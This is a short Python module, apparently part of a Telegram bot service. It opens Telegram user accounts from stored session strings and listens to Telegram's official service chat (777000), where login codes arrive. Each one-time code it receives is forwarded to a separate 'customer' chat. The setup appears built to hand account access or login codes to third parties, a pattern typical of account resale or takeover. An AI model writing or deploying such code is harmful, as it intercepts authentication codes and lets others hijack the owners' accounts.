import asyncio
from telethon import TelegramClient, events
from config import API_ID, API_HASH

active_clients = {}

async def start_userbot_for_account(phone_number: str, session_string: str, bot_instance, customer_chat_id: int):
    from telethon.sessions import StringSession
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await bot_instance.send_message(customer_chat_id, f"⚠️ Account {phone_number} session is not authorized or expired.")
            return

        active_clients[phone_number] = client

        @client.on(events.NewMessage(chats=777000))
        async def otp_listener(event):
            message_text = event.message.message
            await bot_instance.send_message(
                customer_chat_id,
                f"🚨 **New OTP Received for {phone_number}**:\n\n`{message_text}`",
                parse_mode="Markdown"
            )
    except Exception as e:
        print(f"Error starting userbot for {phone_number}: {e}")
  
